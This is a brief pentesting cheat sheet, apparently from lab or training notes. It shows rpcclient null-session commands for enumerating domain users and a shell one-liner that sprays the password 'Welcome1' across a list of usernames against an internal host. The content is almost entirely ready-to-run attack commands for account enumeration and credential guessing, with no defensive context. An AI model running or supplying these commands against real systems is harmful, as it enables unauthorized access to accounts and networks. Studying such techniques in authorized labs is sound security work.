Null session
```
rpcclient -U "" -N $ipadd
```

```
enumdomusers
```


#passwordspraying
# Password Spraying
```powershell
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```